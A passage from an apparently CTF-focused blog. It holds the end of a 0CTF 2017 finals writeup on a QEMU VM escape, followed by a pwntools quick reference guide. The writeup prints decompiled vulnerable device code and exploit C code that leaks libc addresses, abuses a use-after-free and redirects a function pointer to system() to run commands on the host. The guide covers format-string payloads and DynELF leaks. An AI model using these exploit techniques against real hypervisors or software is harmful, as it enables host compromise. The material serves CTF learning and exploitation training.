<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">vdd_mmio_write</span><span class="params">(TencentPCIState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int64_t</span> v4; <span class="comment">// rax@21</span></div><div class="line"></div><div class="line">  <span class="keyword">if</span> ( opaque-&gt;dma_state )</div><div class="line">  &#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      <span class="keyword">switch</span> ( addr )</div><div class="line">      &#123;</div><div class="line">        ...</div><div class="line">        <span class="keyword">case</span> <span class="number">32u</span>LL:</div><div class="line">          ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">dma_addr_t</span>, _QWORD))opaque-&gt;dma_state-&gt;phys_mem_write)(</div><div class="line">            opaque-&gt;dma_buf,</div><div class="line">            opaque-&gt;dma_state-&gt;dst,</div><div class="line">            opaque-&gt;dma_len);                   <span class="comment">// OOB write</span></div><div class="line">          <span class="keyword">break</span>;</div><div class="line">        ...</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>Also in <code>vdd_mmio_write</code>, if <code>addr == 128</code> and <code>opaque-&gt;sr[129] &amp; 1 != 0</code>, we can set a timer which will execute <code>vdd_dma_timer</code> after <code>opaque-&gt;expire_time</code> ns.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">vdd_mmio_write</span><span class="params">(TencentPCIState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int64_t</span> v4; <span class="comment">// rax@21</span></div><div class="line"></div><div class="line">  <span class="keyword">if</span> ( opaque-&gt;dma_state )</div><div class="line">  &#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">0x24</span> )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">if</span> ( addr == <span class="number">128</span> )</div><div class="line">      &#123;</div><div class="line">        <span class="keyword">if</span> ( opaque-&gt;sr[<span class="number">129</span>] &amp; <span class="number">1</span> )</div><div class="line">        &#123;</div><div class="line">          v4 = qemu_clock_get_ns(<span class="number">0</span>);</div><div class="line">          timer_mod(&amp;opaque-&gt;dma_timer, v4 + opaque-&gt;expire_time);</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      ...</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>In <code>vdd_dma_timer</code>, it invokes <code>opaque-&gt;dma_state-&gt;phys_mem_read/write</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">vdd_dma_timer</span><span class="params">(TencentPCIState *opaque)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">if</span> ( opaque-&gt;dma_state-&gt;cmd )</div><div class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">dma_addr_t</span>, _QWORD))opaque-&gt;dma_state-&gt;phys_mem_read)(</div><div class="line">      opaque-&gt;dma_buf,</div><div class="line">      opaque-&gt;dma_state-&gt;dst,</div><div class="line">      opaque-&gt;dma_len &amp; <span class="number">0x2FF</span>);</div><div class="line">  <span class="keyword">else</span></div><div class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">dma_addr_t</span>, _QWORD))opaque-&gt;dma_state-&gt;phys_mem_write)(</div><div class="line">      opaque-&gt;dma_buf,</div><div class="line">      opaque-&gt;dma_state-&gt;dst,</div><div class="line">      opaque-&gt;dma_len &amp; <span class="number">0x2FF</span>);</div><div class="line">  <span class="keyword">if</span> ( opaque-&gt;dma_state-&gt;cmd == <span class="number">1</span> )</div><div class="line">    vdd_raise_irq(opaque, <span class="number">0x100</span>u);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>If <code>pci_vdd_uninit</code> is invoked before <code>vdd_dma_timer</code>, the <em>dma_state</em> will be  used after free.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">pci_vdd_uninit</span><span class="params">(TencentPCIState *opaque)</span></span></div><div class="line">&#123;</div><div class="line">  __int64 v1; <span class="comment">// rax@5</span></div><div class="line">  __int64 v2; <span class="comment">// [rsp+28h] [rbp-8h]@1</span></div><div class="line"></div><div class="line">  v2 = *MK_FP(__FS__, <span class="number">40L</span>L);</div><div class="line">  <span class="built_in">memset</span>(opaque-&gt;sr, <span class="number">0</span>, <span class="number">0x100</span>uLL);</div><div class="line">  <span class="keyword">if</span> ( opaque-&gt;dma_state )</div><div class="line">  &#123;</div><div class="line">    <span class="built_in">memset</span>(opaque-&gt;dma_state, <span class="number">0</span>, <span class="number">0x330</span>uLL);</div><div class="line">    g_free((rcu_head *)opaque-&gt;dma_state);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ( opaque-&gt;buf )</div><div class="line">    g_free((rcu_head *)opaque-&gt;buf);</div><div class="line">  v1 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v2;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>The exploitation is divided into two steps: </p>
<ol>
<li>leak QEMU program address. </li>
<li>hijack control flow</li>
</ol>
<h3 id="Leak-QEMU-program-address"><a href="#Leak-QEMU-program-address" class="headerlink" title="Leak QEMU program address"></a>Leak QEMU program address</h3><p>First, we allocate a buffer and get it’s physical address. Then we set <code>dma_state-&gt;dst</code> to our buffer and set <code>dma_len</code> larger than <code>sizeof(dma_buf)</code>. Finally, we trigger <code>phys_mem_write</code> by <code>writel(0, piomem + 32)</code>. By searching the output, we can find libc addresses and program addresses then calculate the base address of program/libc. </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">phys_mem_write</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> dst, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></div><div class="line">&#123;</div><div class="line">    set_dmastate_dst(dst);</div><div class="line">    set_dmalen(len);</div><div class="line">    writel(<span class="number">0</span>, piomem + <span class="number">32</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">mem_leak</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">    pbuf = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)kmalloc(<span class="number">0x10000</span>, GFP_KERNEL);</div><div class="line">    <span class="built_in">memset</span>(pbuf, <span class="number">0</span>, <span class="number">0x10000</span>);</div><div class="line">    phys_mem_write(virt_to_phys(pbuf), <span class="number">0x1000</span>);</div><div class="line">    <span class="comment">// xxd(pbuf, 0x1000);</span></div><div class="line">    libc_base = search_libc_addr(pbuf, <span class="number">0x1000</span>);</div><div class="line">    printk(<span class="string">"libc base:0x%lx\n"</span>, libc_base);</div><div class="line">    prog_base = search_prog_addr(pbuf, <span class="number">0x1000</span>);</div><div class="line">    printk(<span class="string">"program base:0x%lx\n"</span>, prog_base);</div><div class="line">    system_addr = prog_base + SYSTEM_OFFSET;</div><div class="line">    printk(<span class="string">"system addr:0x%lx\n"</span>, system_addr);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="Control-RIP"><a href="#Control-RIP" class="headerlink" title="Control RIP"></a>Control RIP</h3><p>There are three steps to exploit the use-after-free vulnerability:</p>
<ol>
<li>set a timer</li>
<li>trigger <code>pci_vdd_uninit</code></li>
<li>reallocte and rewrite <code>dma_state</code></li>
</ol>
<p>The following command can trigger <code>pci_vdd_uninit</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo 0 &gt; /sys/bus/pci/slots/4/power</div></pre></td></tr></table></figure>
<p>When <code>vdd_dma_timer</code> runs, we can control rip.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">vdd_dma_timer</span><span class="params">(TencentPCIState *opaque)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">if</span> ( opaque-&gt;dma_state-&gt;cmd )</div><div class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">dma_addr_t</span>, _QWORD))opaque-&gt;dma_state-&gt;phys_mem_read)(</div><div class="line">      opaque-&gt;dma_buf,</div><div class="line">      opaque-&gt;dma_state-&gt;dst,</div><div class="line">      opaque-&gt;dma_len &amp; <span class="number">0x2FF</span>);</div><div class="line">  <span class="keyword">else</span></div><div class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">dma_addr_t</span>, _QWORD))opaque-&gt;dma_state-&gt;phys_mem_write)(</div><div class="line">      opaque-&gt;dma_buf,</div><div class="line">      opaque-&gt;dma_state-&gt;dst,</div><div class="line">      opaque-&gt;dma_len &amp; <span class="number">0x2FF</span>);</div><div class="line">  <span class="keyword">if</span> ( opaque-&gt;dma_state-&gt;cmd == <span class="number">1</span> )</div><div class="line">    vdd_raise_irq(opaque, <span class="number">0x100</span>u);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Becasue the QEMU is launched with <code>--nographic -append &#39;console=ttyS0&#39;</code>, so we can simply invoke <code>system(cmd)</code> to run a command in host machine and the output will show in console.</p>
<p>To invoke <code>system(cmd)</code>, We need to: </p>
<ol>
<li>set <code>opaque-&gt;dma_state-&gt;phys_mem_read</code> to <code>system</code></li>
<li>set <code>opaque-&gt;dma_buf</code> to <code>cmd</code></li>
<li>make sure <code>opaque-&gt;dma_state-&gt;cmd != 0</code>.</li>
</ol>
<p>In <code>vdd_linear_write</code>, when <code>addr == 0</code>, a buffer will be allocated with size of <code>opaque-&gt;dma_len</code>. And the data in <code>opaque-&gt;dma_state-&gt;src</code> with length of <code>opaque-&gt;dma_len</code> will be copied to <code>opaque-&gt;buf</code>, then copied to <code>opaque-&gt;dma_state-&gt;dst</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">vdd_linear_write</span><span class="params">(TencentPCIState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">if</span> ( opaque-&gt;dma_state &amp;&amp; addr &lt;= <span class="number">13</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">switch</span> ( (_DWORD)((<span class="keyword">char</span> *)off_6EF324 + off_6EF324[addr]) )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">        <span class="keyword">if</span> ( opaque-&gt;buf )</div><div class="line">          g_free((rcu_head *)opaque-&gt;buf);</div><div class="line">        opaque-&gt;buf = (<span class="keyword">uint8_t</span> *)g_malloc0(opaque-&gt;dma_len);</div><div class="line">        vdd_dma_read(opaque-&gt;buf, opaque-&gt;dma_state-&gt;src, opaque-&gt;dma_len);</div><div class="line">        vdd_dma_write(opaque-&gt;buf, opaque-&gt;dma_state-&gt;dst, opaque-&gt;dma_len);</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      ...</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">put_fake_dma</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">struct</span> dma fakedma;</div><div class="line">    fakedma.cmd = <span class="number">2</span>;</div><div class="line">    fakedma.phys_mem_read = system_addr;</div><div class="line">    <span class="built_in">memcpy</span>(pbuf, (<span class="keyword">void</span> *)&amp;fakedma, <span class="keyword">sizeof</span>(fakedma));</div><div class="line">    set_dmalen(<span class="number">0x330</span>);</div><div class="line">    set_dmastate_src(virt_to_phys(pbuf));</div><div class="line">    set_dmastate_dst(virt_to_phys(pbuf));</div><div class="line">    outb(<span class="number">0</span>, VDB_PORT + <span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/tixAsK6.png" alt=""></p>
<p><a href="https://gist.github.com/Eadom/3d5600b6931fbf328ffb20f10eeb3a52" target="_blank" rel="external">Exploit script</a></p>
<p>Thanks for Atum’s help.</p>

                    
                        
                    
                    
                        <p>
                            <a href="/writeups/qemu-escape-vm-escape-from-0ctf-2017-finals-writeup/#post-footer" class="postShorten-excerpt_link link">
                                Comment and share
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/uncategorized/pwntools-quick-reference-guide/">
                            Pwntools Quick Reference Guide
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2016-03-02T18:33:29+08:00">
	
		    Mar 02, 2016
    	
    </time>
    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <blockquote>
<p>pwntools is a CTF framework and exploit development library. Written in Python, it is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible.</p>
</blockquote>
<h2 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h2><p>Setting the Target Architecture and OS:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">context(arch=<span class="string">'arm'</span>, os=<span class="string">'linux'</span>, endian=<span class="string">'big'</span>, log_level=<span class="string">'debug'</span>)</div></pre></td></tr></table></figure>
<h2 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h2><p>It’s similar to <code>logging.Logger</code>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>log.info(<span class="string">'Hello, world!'</span>)</div><div class="line">[*] Hello, world!</div></pre></td></tr></table></figure>
<h2 id="Making-connections"><a href="#Making-connections" class="headerlink" title="Making connections"></a>Making connections</h2><h3 id="New-a-tube"><a href="#New-a-tube" class="headerlink" title="New a tube"></a>New a tube</h3><p>Create a tube instance from a local program or a remote conncetion.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">conn = process(<span class="string">'./pwn'</span>)</div><div class="line">conn = remote(<span class="string">'ftp.debian.org'</span>,<span class="number">21</span>)</div></pre></td></tr></table></figure>
<h3 id="Comunication"><a href="#Comunication" class="headerlink" title="Comunication"></a>Comunication</h3><h4 id="Send-and-recv"><a href="#Send-and-recv" class="headerlink" title="Send and recv"></a>Send and recv</h4><p>There are many functions to send or recv data via tube.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">recv(numb = <span class="number">4096</span>, timeout = default)</div><div class="line">recvuntil(delims, drop=<span class="keyword">False</span>, timeout = default)</div><div class="line">recvn(numb, timeout = default)</div><div class="line">recvlines(numlines, keepends = <span class="keyword">False</span>, timeout = default)</div><div class="line">recvline(keepends = <span class="keyword">True</span>, timeout = default)</div><div class="line">recvregex(regex, exact = <span class="keyword">False</span>, timeout = default)</div><div class="line">recvrepeat(timeout = default)  <span class="comment"># Receives data until a timeout or EOF is reached.</span></div><div class="line">recvall(self, timeout=Timeout.forever)  <span class="comment"># Receives data until EOF is reached.</span></div><div class="line">...</div><div class="line"></div><div class="line">send(data)</div><div class="line">sendline(line)</div><div class="line">...</div><div class="line"></div><div class="line">interactive()</div></pre></td></tr></table></figure>
<h4 id="Listen"><a href="#Listen" class="headerlink" title="Listen"></a>Listen</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">l = listen(port=<span class="number">2333</span>, bindaddr = <span class="string">"0.0.0.0"</span>)</div><div class="line">c = l.wait_for_connection()</div><div class="line">c.recv()</div></pre></td></tr></table></figure>
<h2 id="ELF-Manipulation"><a href="#ELF-Manipulation" class="headerlink" title="ELF Manipulation"></a>ELF Manipulation</h2><p>Stop hard-coding things! Look them up at runtime with <code>pwnlib.elf</code>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>e = ELF(<span class="string">'/bin/cat'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(e.address) </div><div class="line"><span class="number">0x400000</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(e.symbols[<span class="string">'write'</span>]) </div><div class="line"><span class="number">0x401680</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(e.got[<span class="string">'write'</span>]) </div><div class="line"><span class="number">0x60b070</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(e.plt[<span class="string">'write'</span>]) </div><div class="line"><span class="number">0x401680</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>e.address = <span class="number">0x0</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(e.symbols[<span class="string">'write'</span>]) </div><div class="line"><span class="number">0x1680</span></div></pre></td></tr></table></figure>
<p>You can even patch and save the files.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>e = ELF(<span class="string">'/bin/cat'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>e.read(e.address+<span class="number">1</span>, <span class="number">3</span>)</div><div class="line"><span class="string">'ELF'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>e.asm(e.address, <span class="string">'ret'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>e.save(<span class="string">'/tmp/quiet-cat'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>disasm(file(<span class="string">'/tmp/quiet-cat'</span>,<span class="string">'rb'</span>).read(<span class="number">1</span>))</div></pre></td></tr></table></figure>
<h2 id="Debug-with-gdb"><a href="#Debug-with-gdb" class="headerlink" title="Debug with gdb"></a>Debug with gdb</h2><p><code>pwnlib.gdb.attach()</code> starts GDB in a <strong>new terminal</strong> and attach to target.</p>
<p>Target can be a process, (addr, port), or ssh channel.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">p = process(<span class="string">'./helloworld'</span>)</div><div class="line">gdb.attach(p, execute=<span class="string">"b *0x4000000"</span>)  <span class="comment"># execute:GDB script to run after attaching.</span></div><div class="line"></div><div class="line">gdb.attach((<span class="string">'127.0.0.1'</span>, <span class="number">8765</span>))  <span class="comment"># attach to remote gdb server</span></div><div class="line"></div><div class="line">s = ssh(host=<span class="string">'rpi'</span>, user=<span class="string">'pi'</span>)</div><div class="line">conn = s.process(<span class="string">'/tmp/helloworld'</span>)</div><div class="line">gdb.attach(conn)  <span class="comment"># start gdb on remote server via ssh</span></div></pre></td></tr></table></figure>
<p>If you want to start GDB in a split window in tmux:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</div><div class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-v'</span>]</div></pre></td></tr></table></figure>
<h2 id="Fmtstr"><a href="#Fmtstr" class="headerlink" title="Fmtstr"></a>Fmtstr</h2><p><code>pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;)</code></p>
<p>It can generate payload for 32 or 64 bits architectures. The size of the addr is taken from <code>context.bits</code></p>
<p>Parameters:    </p>
<ul>
<li>offset (int) – the first formatter’s offset you control</li>
<li>writes (dict) – dict with addr, value {addr: value, addr2: value2}</li>
<li>numbwritten (int) – number of byte already written by the printf function</li>
<li>write_size (str) – must be byte, short or int. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)</li>
</ul>
<h2 id="DynELF"><a href="#DynELF" class="headerlink" title="DynELF"></a>DynELF</h2><p><code>pwnlib.dynelf</code> — Resolving remote functions using leaks</p>
<p>Resolve symbols in loaded, dynamically-linked ELF binaries. Given a function which can leak data at an arbitrary address, any symbol in any loaded library can be resolved.</p>
<p>This is an example in the document:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Assume a process or remote connection</span></div><div class="line">p = process(<span class="string">'./pwnme'</span>)</div><div class="line"></div><div class="line"><span class="comment"># Declare a function that takes a single address, and</span></div><div class="line"><span class="comment"># leaks at least one byte at that address.</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></div><div class="line">    data = p.read(address, <span class="number">4</span>)</div><div class="line">    log.debug(<span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</div><div class="line">    <span class="keyword">return</span> data</div><div class="line"></div><div class="line"><span class="comment"># For the sake of this example, let's say that we</span></div><div class="line"><span class="comment"># have any of these pointers.  One is a pointer into</span></div><div class="line"><span class="comment"># the target binary, the other two are pointers into libc</span></div><div class="line">main   = <span class="number">0xfeedf4ce</span></div><div class="line">libc   = <span class="number">0xdeadb000</span></div><div class="line">system = <span class="number">0xdeadbeef</span></div><div class="line"></div><div class="line"><span class="comment"># With our leaker, and a pointer into our target binary,</span></div><div class="line"><span class="comment"># we can resolve the address of anything.</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># We do not actually need to have a copy of the target</span></div><div class="line"><span class="comment"># binary for this to work.</span></div><div class="line">d = DynELF(leak, main)</div><div class="line"><span class="keyword">assert</span> d.lookup(<span class="keyword">None</span>,     <span class="string">'libc'</span>) == libc</div><div class="line"><span class="keyword">assert</span> d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>) == system</div><div class="line"></div><div class="line"><span class="comment"># However, if we *do* have a copy of the target binary,</span></div><div class="line"><span class="comment"># we can speed up some of the steps.</span></div><div class="line">d = DynELF(leak, main, elf=ELF(<span class="string">'./pwnme'</span>))</div><div class="line"><span class="keyword">assert</span> d.lookup(<span class="keyword">None</span>,     <span class="string">'libc'</span>) == libc</div><div class="line"><span class="keyword">assert</span> d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>) == system</div><div class="line"></div><div class="line"><span class="comment"># Alternately, we can resolve symbols inside another library,</span></div><div class="line"><span class="comment"># given a pointer into it.</span></div><div class="line">d = DynELF(leak, libc + <span class="number">0x1234</span>)</div><div class="line"><span class="keyword">assert</span> d.lookup(<span class="string">'system'</span>)      == system</div></pre></td></tr></table></figure>
<h2 id="Utility"><a href="#Utility" class="headerlink" title="Utility"></a>Utility</h2><h3 id="Generation-of-unique-sequences"><a href="#Generation-of-unique-sequences" class="headerlink" title="Generation of unique sequences"></a>Generation of unique sequences</h3><p><code>pwnlib.util.cyclic.cyclic(length = None, alphabet = string.ascii_lowercase, n = 4)</code></p>
<p><code>pwnlib.util.cyclic.cyclic_find(subseq, alphabet = string.ascii_lowercase, n = None)</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>cyclic(<span class="number">20</span>)</div><div class="line"><span class="string">'aaaabaaacaaadaaaeaaa'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>cyclic(alphabet = <span class="string">"ABC"</span>, n = <span class="number">3</span>)</div><div class="line"><span class="string">'AAABAACABBABCACBACCBBBCBCCC'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>cyclic_find(cyclic(alphabet = <span class="string">"ABC"</span>, n = <span class="number">3</span>)[<span class="number">3</span>:<span class="number">6</span>], alphabet = <span class="string">"ABC"</span>, n = <span class="number">3</span>)</div><div class="line"><span class="number">3</span></div></pre></td></tr></table></figure>
